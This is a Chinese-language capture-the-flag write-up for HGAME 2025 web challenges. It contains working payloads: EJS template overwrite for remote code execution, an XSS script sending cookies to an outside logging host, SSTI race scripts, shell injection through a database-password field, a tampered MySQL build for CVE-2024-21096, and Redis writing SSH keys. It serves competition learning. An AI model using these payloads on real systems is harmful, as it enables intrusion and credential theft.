class=\"line\"\u003e\u003cspan class=\"ln\"\u003e5\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003efile_content\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eread\u003c/span\u003e\u003cspan class=\"p\"\u003e())\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e6\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e7\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ekeyword\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003edangerous_keywords\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e8\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003ekeyword\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003efile_content\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e9\u003c/span\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# 找到危险关键字，返回 True\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e简单绕一下\u003c/p\u003e","title":"GHCTF-2025-Web-Writeup"},{"content":"Web week1 Level 24 Pacman 拿到环境\n一个小游戏，猜测应该是js审计\n查看index.js发现代码进行了混淆\n可以用工具反混淆一下，增加一下可读性\nhttps://tool.yuanrenxue.cn/decode_obfuscator\n反混淆之后找到这个\n感觉是栅栏，解密拿到flag\nLevel 47 BandBomb 文件上传\n附件有源码\n1const express = require(\u0026#39;express\u0026#39;); 2const multer = require(\u0026#39;multer\u0026#39;); 3const fs = require(\u0026#39;fs\u0026#39;); 4const path = require(\u0026#39;path\u0026#39;); 5 6const app = express(); 7 8app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); 9 10app.use(\u0026#39;/static\u0026#39;, express.static(path.join(__dirname, \u0026#39;public\u0026#39;))); 11app.use(express.json()); 12 13const storage = multer.diskStorage({ 14 destination: (req, file, cb) =\u0026gt; { 15 const uploadDir = \u0026#39;uploads\u0026#39;; 16 if (!fs.existsSync(uploadDir)) { 17 fs.mkdirSync(uploadDir); 18 } 19 cb(null, uploadDir); 20 }, 21 filename: (req, file, cb) =\u0026gt; { 22 cb(null, file.originalname); 23 } 24}); 25 26const upload = multer({ 27 storage: storage, 28 fileFilter: (_, file, cb) =\u0026gt; { 29 try { 30 if (!file.originalname) { 31 return cb(new Error(\u0026#39;无效的文件名\u0026#39;), false); 32 } 33 cb(null, true); 34 } catch (err) { 35 cb(new Error(\u0026#39;文件处理错误\u0026#39;), false); 36 } 37 } 38}); 39 40app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { 41 const uploadsDir = path.join(__dirname, \u0026#39;uploads\u0026#39;); 42 43 if (!fs.existsSync(uploadsDir)) { 44 fs.mkdirSync(uploadsDir); 45 } 46 47 fs.readdir(uploadsDir, (err, files) =\u0026gt; { 48 if (err) { 49 return res.status(500).render(\u0026#39;mortis\u0026#39;, { files: [] }); 50 } 51 res.render(\u0026#39;mortis\u0026#39;, { files: files }); 52 }); 53}); 54 55app.post(\u0026#39;/upload\u0026#39;, (req, res) =\u0026gt; { 56 upload.single(\u0026#39;file\u0026#39;)(req, res, (err) =\u0026gt; { 57 if (err) { 58 return res.status(400).json({ error: err.message }); 59 } 60 if (!req.file) { 61 return res.status(400).json({ error: \u0026#39;没有选择文件\u0026#39; }); 62 } 63 res.json({ 64 message: \u0026#39;文件上传成功\u0026#39;, 65 filename: req.file.filename 66 }); 67 }); 68}); 69 70app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 71 const { oldName, newName } = req.body; 72 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 73 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 74 75 if (!oldName || !newName) { 76 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 77 } 78 79 fs.rename(oldPath, newPath, (err) =\u0026gt; { 80 if (err) { 81 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 82 } 83 res.json({ message: \u0026#39; \u0026#39; }); 84 }); 85}); 86 87app.listen(port, () =\u0026gt; { 88 console.log(`服务器运行在 http://localhost:${port}`); 89}); 这题有点像24国赛的ezjs\n文章 - 对ejs引擎漏洞及函数特性的利用 - 先知社区\n可以看到在 /rename 路由\n1app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 2 const { oldName, newName } = req.body; 3 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 4 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 5 6 if (!oldName || !newName) { 7 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 8 } 9 10 fs.rename(oldPath, newPath, (err) =\u0026gt; { 11 if (err) { 12 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 13 } 14 res.json({ message: \u0026#39; \u0026#39; }); 15 }); 16}); 这个路由会将uploads目录中的文件重命名\n我们可以利用这个路由，通过目录穿越对任意文件进行移动和重命名\n也就是说我们可以通过上传恶意的ejs到uploads目录，接着通过/rename路由将我们上传的恶意ejs文件覆写掉/路由的模板文件mortis.ejs实现RCE\neval.ejs\n\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;whoami\u0026#39;) %\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt; 将ejs上传\n覆写原来的ejs\n访问/\n这题flag藏在环境变量里\npayload:\n\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;printenv\u0026#39;) %\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt; Level 69 MysteryMessageBoard 密码爆破，XSS cookie窃取\n爆出来 shallot/888888\n登进去看到一个留言板\n猜测是xss，测试一下\n\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt; 同时通过dirsearch扫到了/admin路由\n根据这句话大概可以猜到，访问/admin路由的时候应该会在后端以admin的身份来访问留言板\n也就是说我们可以进行cookie窃取\npayload:\n\u0026lt;script\u0026gt;document.location=\u0026#39;http://dfny33.ceye.io?\u0026#39;+document.cookie;\u0026lt;/script\u0026gt; 将payload输出在留言板，然后访问/admin\n成功拿到admin的cookie\n拿admin的cookie访问/flag即可拿到flag\nLevel 25 双面人派对 这道题有两个环境，一开始以为是re，其实感觉更像是misc\n访问app.service-web可以拿到一个main文件\n是一个elf文件\n用exeinfo PE查到用upx加壳了\n用upx官方工具就可以脱壳\nhttps://github.com/upx/upx/releases/latest\n脱壳之后用ida打开\n可以找到一段关于minio的密钥信息\n.noptrdata:0000000000D614E0\t000000AA\tC\tminio:\\r\\n endpoint: \\\u0026#34;127.0.0.1:9000\\\u0026#34;\\r\\n access_key: \\\u0026#34;minio_admin\\\u0026#34;\\r\\n secret_key: \\\u0026#34;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=\\\u0026#34;\\r\\n bucket: \\\u0026#34;prodbucket\\\u0026#34;\\r\\n key: \\\u0026#34;update\\\u0026#34; 那我们大概就能猜到另一个环境应该就是这个minio的服务\n用mc通过Access Key和Secret Key连接上去\n里面有两个储存桶\n将两个储存桶都下载下来\n/hints里面放的是8080服务的源码，/prodbucket里面是源码编译后的文件叫做update，猜测是热更新\n看一下源码\n1package main 2 3import ( 4\t\u0026#34;level25/fetch\u0026#34; 5\t\u0026#34;level25/conf\u0026#34; 6\t\u0026#34;github.com/gin-gonic/gin\u0026#34; 7\t\u0026#34;github.com/jpillora/overseer\u0026#34; 8) 9 10func main() { 11\tfetcher := \u0026amp;fetch.MinioFetcher{ 12\tBucket: conf.MinioBucket, 13\tKey: conf.MinioKey, 14\tEndpoint: conf.MinioEndpoint, 15\tAccessKey: conf.MinioAccessKey, 16\tSecretKey: conf.MinioSecretKey, 17\t} 18\toverseer.Run(overseer.Config{ 19\tProgram: program, 20\tFetcher: fetcher, 21\t}) 22 23} 24 25func program(state overseer.State) { 26\tg := gin.Default() 27\tg.StaticFS(\u0026#34;/\u0026#34;, gin.Dir(\u0026#34;.\u0026#34;, true)) 28\tg.Run(\u0026#34;:8080\u0026#34;) 29} 我们可以猜测/路由展示的这个.目录就是前面我们下周main文件的目录\n我们可以把.改成根目录/，然后将编译后的源码覆写掉原来的update，热更新后，我们就能直接访问根目录了\npayload:\npackage main\rimport (\r\u0026#34;level25/fetch\u0026#34;\r\u0026#34;level25/conf\u0026#34;\r\u0026#34;github.com/gin-gonic/gin\u0026#34;\r\u0026#34;github.com/jpillora/overseer\u0026#34;\r)\rfunc main() {\rfetcher := \u0026amp;fetch.MinioFetcher{\rBucket: conf.MinioBucket,\rKey: conf.MinioKey,\rEndpoint: conf.MinioEndpoint,\rAccessKey: conf.MinioAccessKey,\rSecretKey: conf.MinioSecretKey,\r}\roverseer.Run(overseer.Config{\rProgram: program,\rFetcher: fetcher,\r})\r}\rfunc program(state overseer.State) {\rg := gin.Default()\rg.StaticFS(\u0026#34;/abc\u0026#34;, gin.Dir(\u0026#34;/\u0026#34;, true))\rg.Run(\u0026#34;:8080\u0026#34;)\r} 这里我将/路由改成了/abc，因为不知道为啥我用/路由不行\n将源码编译后覆写到储存桶上\n访问/abc\n拿到flag\nLevel 38475 角落 ssti/条件竞争\n/robots.txt有个/app.conf\n访问/app.conf\n这里展示了httpd.conf的片段\n这里给出了源码的位置还有一个重写引擎的规则，猜测应该是该版本的apache存在源码泄露\n同时在响应标头能找到Apache的版本信息\n可以找到这个版本的apache存在源码泄露，而且是跟重写规则有关\nCVE-2024-38475\n网上没找到什么poc\n但是可以找到漏洞发现者的一篇文章\nhttps://blog.orange.tw/posts/2024-08-confusion-attacks-en/\n根据这篇文章我们可以构造出paylaod\nhttp://node1.hgame.vidar.club:31155/admin/usr/local/apache2/app/app.py%3F 这道题多了一个RewriteCond \u0026ldquo;%{HTTP_USER_AGENT}\u0026rdquo; \u0026ldquo;^L1nk/\u0026rdquo;，只需要在user-agent前面加上L1nk/即可\n拿到源码\n1from flask import Flask, request, render_template, render_template_string, redirect 2import os 3import templates 4 5app = Flask(__name__) 6pwd = os.path.dirname(__file__) 7show_msg = templates.show_msg 8 9 10def readmsg(): 11\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 12\tif os.path.exists(filename): 13\tf = open(filename, \u0026#39;r\u0026#39;) 14\tmessage = f.read() 15\tf.close() 16\treturn message 17\telse: 18\treturn \u0026#39;No message now.\u0026#39; 19 20 21@app.route(\u0026#39;/index\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 22def index(): 23\tstatus = request.args.get(\u0026#39;status\u0026#39;) 24\tif status is None: 25\tstatus = \u0026#39;\u0026#39; 26\treturn render_template(\u0026#34;index.html\u0026#34;, status=status) 27 28 29@app.route(\u0026#39;/send\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 30def write_message(): 31\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 32\tmessage = request.form[\u0026#39;message\u0026#39;] 33 34\tf = open(filename, \u0026#39;w\u0026#39;) 35\tf.write(message) 36\tf.close() 37 38\treturn redirect(\u0026#39;index?status=Send successfully!!\u0026#39;) 39\t40@app.route(\u0026#39;/read\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 41def read_message(): 42\tif \u0026#34;{\u0026#34; not in readmsg(): 43\tshow = show_msg.replace(\u0026#34;{{message}}\u0026#34;, readmsg()) 44\treturn render_template_string(show) 45\treturn \u0026#39;waf!!\u0026#39; 46\t47 48if __name__ == \u0026#39;__main__\u0026#39;: 49\tapp.run(host = \u0026#39;0.0.0.0\u0026#39;, port = 5000) 可以看到/read路由存在ssti，但是他waf掉了最重要的{\n但是可以看到这个/send路由会将传入的信息写入message.txt文件，在访问/read路由的时候则会读取message.txt文件。这么一来我们就可以考虑通过竞争的方式来绕过waf了。竞争思路大概就是我在很短的时间内连续发送两条信息，第一条信息是合法信息，而第二条信息是不合法的，那么就会存在一种情况，当第一条信息通过了判断，接下来要将文件的内容插入到模板中渲染的时候，刚好第二条不合法的信息覆写了message.txt，那么插入模板中的就是第二条不合法的信息了\n接下来就是搓脚本发包\n三个脚本\npoc1\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;{{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /flag\u0026#39;).read()}}\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) 8 poc2\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;123\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) poc3\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/read\u0026#34; 4 burp0_headers = {\u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 res = requests.get(burp0_url, headers=burp0_headers) 6 # print(res.text) 7 if \u0026#34;hgame\u0026#34; in (res.text): 8 print(res.text) 9 break 成功执行，拿到flag\nweek2 week2强度有点高，就打了一道HoneyPot，复现一手\nLevel 21096 HoneyPot 应该是非预期\n可以找到这个函数，也就是/api/import，可以进行命令拼接\n1func ImportData(c *gin.Context) { 2 var config ImportConfig 3 if err := c.ShouldBindJSON(\u0026amp;config); err != nil { 4 c.JSON(http.StatusBadRequest, gin.H{ 5 \u0026#34;success\u0026#34;: false, 6 \u0026#34;message\u0026#34;: \u0026#34;Invalid request body: \u0026#34; + err.Error(), 7 }) 8 return 9 } 10 if err := validateImportConfig(config); err != nil { 11 c.JSON(http.StatusBadRequest, gin.H{ 12 \u0026#34;success\u0026#34;: false, 13 \u0026#34;message\u0026#34;: \u0026#34;Invalid input: \u0026#34; + err.Error(), 14 }) 15 return 16 } 17 18 config.RemoteHost = sanitizeInput(config.RemoteHost) 19 config.RemoteUsername = sanitizeInput(config.RemoteUsername) 20 config.RemoteDatabase = sanitizeInput(config.RemoteDatabase) 21 config.LocalDatabase = sanitizeInput(config.LocalDatabase) 22 if manager.db == nil { 23 dsn := buildDSN(localConfig) 24 db, err := sql.Open(\u0026#34;mysql\u0026#34;, dsn) 25 if err != nil { 26 c.JSON(http.StatusInternalServerError, gin.H{ 27 \u0026#34;success\u0026#34;: false, 28 \u0026#34;message\u0026#34;: \u0026#34;Failed to connect to local database: \u0026#34; + err.Error(), 29 }) 30 return 31 } 32 33 if err := db.Ping(); err != nil { 34 db.Close() 35 c.JSON(http.StatusInternalServerError, gin.H{ 36 \u0026#34;success\u0026#34;: false, 37 \u0026#34;message\u0026#34;: \u0026#34;Failed to ping local database: \u0026#34; + err.Error(), 38 }) 39 return 40 } 41 42 manager.db = db 43 } 44 if err := createdb(config.LocalDatabase); err != nil { 45 c.JSON(http.StatusInternalServerError, gin.H{ 46 \u0026#34;success\u0026#34;: false, 47 \u0026#34;message\u0026#34;: \u0026#34;Failed to create local database: \u0026#34; + err.Error(), 48 }) 49 return 50 } 51 //Never able to inject shell commands,Hackers can\u0026#39;t use this,HaHa 52 command := fmt.Sprintf(\u0026#34;/usr/local/bin/mysqldump -h %s -u %s -p%s %s |/usr/local/bin/mysql -h 127.0.0.1 -u %s -p%s %s\u0026#34;, 53 config.RemoteHost, 54 config.RemoteUsername, 55 config.RemotePassword, 56 config.RemoteDatabase, 57 localConfig.Username, 58 localConfig.Password, 59 config.LocalDatabase, 60 ) 61 fmt.Println(command) 62 cmd := exec.Command(\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, command) 63 if err := cmd.Run(); err != nil { 64 c.JSON(http.StatusInternalServerError, gin.H{ 65 \u0026#34;success\u0026#34;: false, 66 \u0026#34;message\u0026#34;: \u0026#34;Failed to import data: \u0026#34; + err.Error(), 67 }) 68 return 69 } 70 71 c.JSON(http.StatusOK, gin.H{ 72 \u0026#34;success\u0026#34;: true, 73 \u0026#34;message\u0026#34;: \u0026#34;Data imported successfully\u0026#34;, 74 }) 75} Payload\n1{\u0026#34;remote_host\u0026#34;:\u0026#34;127.0.0.1\u0026#34;,\u0026#34;remote_port\u0026#34;:\u0026#34;3306\u0026#34;,\u0026#34;remote_username\u0026#34;:\u0026#34;root\u0026#34;,\u0026#34;remote_password\u0026#34;:\u0026#34;123456;/writeflag;#\u0026#34;,\u0026#34;remote_database\u0026#34;:\u0026#34;123\u0026#34;,\u0026#34;local_database\u0026#34;:\u0026#34;123\u0026#34;} 访问/flag拿到flag\nLevel 21096 HoneyPot_Revenge [CVE-2024-21096 mysqldump命令注入漏洞简析 | Ec3o](https://tech.ec3o.fun/2024/10/25/Web-Vulnerability Reproduction/CVE-2024-21096/)\n出题人的博客有写过这个知识点\n编译恶意Mysql 安装编译依赖\nsudo apt-get update\rsudo apt-get install -y build-essential cmake bison libncurses5-dev libtirpc-dev libssl-dev pkg-config\rwget https://dev.mysql.com/get/Downloads/MySQL-8.0/mysql-boost-8.0.34.tar.gz\rtar -zxvf mysql-boost-8.0.34.tar.gz\rcd mysql-8.0.34 修改模板文件/include/mysql_version.h.in\nvim include/mysql_version.h.in /* Copyright Abandoned 1996,1999 TCX DataKonsult AB \u0026amp; Monty Program KB\r\u0026amp; Detron HB, 1996, 1999-2004, 2007 MySQL AB.\rThis file is public domain and comes with NO WARRANTY of any kind\r*/\r/* Version numbers for protocol \u0026amp; mysqld */\r#ifndef _mysql_version_h\r#define _mysql_version_h\r#define PROTOCOL_VERSION @PROTOCOL_VERSION@\r#define MYSQL_SERVER_VERSION \u0026#34;8.0.0-injection-test\\n\\\\! /writeflag\u0026#34;\r#define MYSQL_BASE_VERSION \u0026#34;mysqld-8.0.34\u0026#34;\r#define MYSQL_SERVER_SUFFIX_DEF \u0026#34;@MYSQL_SERVER_SUFFIX@\u0026#34;\r#define MYSQL_VERSION_ID @MYSQL_VERSION_ID@\r#define MYSQL_PORT @MYSQL_TCP_PORT@\r#define MYSQL_ADMIN_PORT @MYSQL_ADMIN_TCP_PORT@\r#define MYSQL_PORT_DEFAULT @MYSQL_TCP_PORT_DEFAULT@\r#define MYSQL_UNIX_ADDR \u0026#34;@MYSQL_UNIX_ADDR@\u0026#34;\r#define MYSQL_CONFIG_NAME \u0026#34;my\u0026#34;\r#define MYSQL_PERSIST_CONFIG_NAME \u0026#34;mysqld-auto\u0026#34;\r#define MYSQL_COMPILATION_COMMENT \u0026#34;@COMPILATION_COMMENT@\u0026#34;\r#define MYSQL_COMPILATION_COMMENT_SERVER \u0026#34;@COMPILATION_COMMENT_SERVER@\u0026#34;\r#define LIBMYSQL_VERSION \u0026#34;8.0.34-custom\u0026#34;\r#define LIBMYSQL_VERSION_ID @MYSQL_VERSION_ID@\r#ifndef LICENSE\r#define LICENSE GPL\r#endif /* LICENSE */\r#endif /* _mysql_version_h */ 执行命令的位置为\n#define MYSQL_SERVER_VERSION \u0026#34;8.0.0-injection-test\\n\\\\! /writeflag\u0026#34; 修改成要执行的命令之后，开始编译\nmkdir build\rcd build\rcmake .. -DDOWNLOAD_BOOST=1 -DWITH_BOOST=../boost\rmake -j$(nproc) 我的服务器太烂了，编译了五个小时还编译失败了\n所以后面在本地用wsl编译完后再上传到服务器上\n本地编译的时候最好使用与服务器相同的路径\n不然install的时候会报错，很麻烦\n加下来在服务器上安装编译好的mysql\n安装\nsudo make install 创建⽤⼾组\nsudo groupadd mysql\rsudo useradd -r -g mysql -s /bin/false mysql 初始化\nsudo /usr/local/mysql/bin/mysqld --initialize --user=mysql --\rbasedir=/usr/local/mysql --datadir=/usr/local/mysql/data 初始化信息\nbasedir=/usr/local/mysql --datadir=/usr/local/mysql/data\r2025-02-20T16:35:47.430647Z 0 [System] [MY-013169] [Server] /usr/local/mysql/bin/mysqld (mysqld 8.0.0-injection-test \\! /writeflag) initializing of server in progress as process 557354\r2025-02-20T16:35:47.483565Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.\r2025-02-20T16:35:48.220016Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.\r2025-02-20T16:35:51.634311Z 6 [Note] [MY-010454] [Server] A temporary password is generated for root@localhost: #fq;t8\u0026lt;;j5AH\r-bash: --datadir=/usr/local/mysql/data: No such file or directory 设置⽬录权限\nsudo chown -R mysql:mysql /usr/local/mysql\rsudo chown -R mysql:mysql /usr/local/mysql/data 启动服务\nsudo /usr/local/mysql/bin/mysqld_safe --user=mysql \u0026amp; 登录\n/usr/local/mysql/bin/mysql -u root -p 修改密码\nALTER USER \u0026#39;root\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;password\u0026#39;; 由于需要进行远程连接，需要配置root登录支持\nCREATE USER \u0026#39;root\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;password\u0026#39;; //创建用户\rGRANT ALL PRIVILEGES ON *.* TO \u0026#39;root\u0026#39;@\u0026#39;%\u0026#39;; //授予权限\rFLUSH PRIVILEGES; 创建数据库\nCREATE DATABASE test;\rEXIT; 接下来就可以去导入数据了\n访问/flag,拿到flag\nLevel 60 SignInJava 这个是真不懂😥，等后面再回头看\nLevel 111 不存在的车厢 这是一道关于整数溢出打协议⾛私的题目\n题目给出的web服务⾃定义了⼀个H111协议，我们可以发现这个自定义协议中的所有Length字段均为uint16类型(0~65535)，而且没有做任何的长度限制，也就是说存在整数溢出\n而且这个协议是支持连接复用的，也就是同一TCP连接可处理多个请求。第一个请求发生溢出后，残留数据与后续请求混合后，服务端会错误解析到我们第二个请求，从⽽⾛私进第⼆个请求。\n官方wp是这么说的：\n开始复现\n先编写⼀段测试，放在protocol/request_test.go，通过go test -v -run TestGenRequest拿到输出\n1package protocol 2 3import ( 4\t\u0026#34;bytes\u0026#34; 5\t\u0026#34;encoding/hex\u0026#34; 6\t\u0026#34;net/http\u0026#34; 7\t\u0026#34;testing\u0026#34; 8) 9 10 11func TestGenRequest(t *testing.T) { 12\tvar buf bytes.Buffer 13\terr := WriteH111Request(\u0026amp;buf, \u0026amp;http.Request{ 14\tMethod: \u0026#34;POST\u0026#34;, 15\tRequestURI: \u0026#34;/flag\u0026#34;, 16\t}) 17\tif err != nil { 18\tt.Fatalf(\u0026#34;expected no error, got %v\u0026#34;, err) 19\t} 20\tt.Log(len(buf.Bytes())) 21\tt.Log(hex.EncodeToString(buf.Bytes())) 22} 用WriteH111Request序列化一个POST /flag请求\n序列化后的十六进制数据\n0004504f535400052f666c616700000000 在这段数据后⾯补⻬0，补⻬到65536，产⽣Length溢出\npayload:\nGET / HTTP/1.1\rHost: node1.hgame.vidar.club:30529\r{{hexdec(0004504f535400052f666c616700000000)}}{{padding:zero(0|65519)}} Level 257 ⽇落的紫罗兰 题⽬端⼝为ssh服务和redis服务\n首先使用 ssh-keygen 生成密钥对\nssh-keygen -t rsa 把生成的公钥添加到 spaced_key.txt 文件里\n(echo -e “\\n\\n”; cat /root/.ssh/id_rsa.pub; echo -e “\\n\\n”) \u0026gt; spaced_key.txt 利用 Redis 服务写入 SSH 公钥\ncat spaced_key.txt |redis-cli -h node1.hgame.vidar.club -p 30428 -x set ssh_key\rredis-cli -h node1.hgame.vidar.club -p 30428 redis-cli -h node1.hgame.vidar.club -p 30428\rnode1.hgame.vidar.club:30428\u0026gt; config set dir /home/mysid/.ssh\rOK\rnode1.hgame.vidar.club:30428\u0026gt; config set dbfilename \u0026#34;authorized_keys\u0026#34;\rOK\rnode1.hgame.vidar.club:30428\u0026gt; save\rOK\rnode1.hgame.vidar.club:30428\u0026gt; exit user.txt里面有ssh的用户名\n连ssh\nssh -i /root/.ssh/id_rsa mysid@node1.hgame.vidar.club -p 31266 要提权\n这题用的是上传恶意ldap服务器利⽤本地java应⽤提权\n我咋知道本地有Java环境呢？find一下就好\nfind / -name \u0026#34;java\u0026#34; 2\u0026gt;/dev/null 上传恶意 JAR 包\nscp -i /root/.ssh/id_rsa -P 31266 ./JNDIMap-0.0.1.jar mysid@node1.hgame.vidar.club:/tmp /usr/local/openjdk-8/bin/java -jar /tmp/JNDIMap-0.0.1.jar -i 127.0.0.1 -l 389 -u \u0026#34;/Deserialize/Jackson/Command/Y2htb2QgNzc3IC9mbGFn\u0026#34; 触发漏洞\ncurl -X POST -d \u0026#34;baseDN=a/b\u0026amp;filter=a\u0026#34; http://127.0.0.1:8080/search 成功执行\n","permalink":"http://localhost:1313/post/hgame_2025/","summary":"\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"week1\"\u003eweek1\u003c/h3\u003e\n\u003ch3 id=\"level-24-pacman\"\u003eLevel 24 Pacman\u003c/h3\u003e\n\u003cp\u003e拿到环境\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151704506\" loading=\"lazy\" 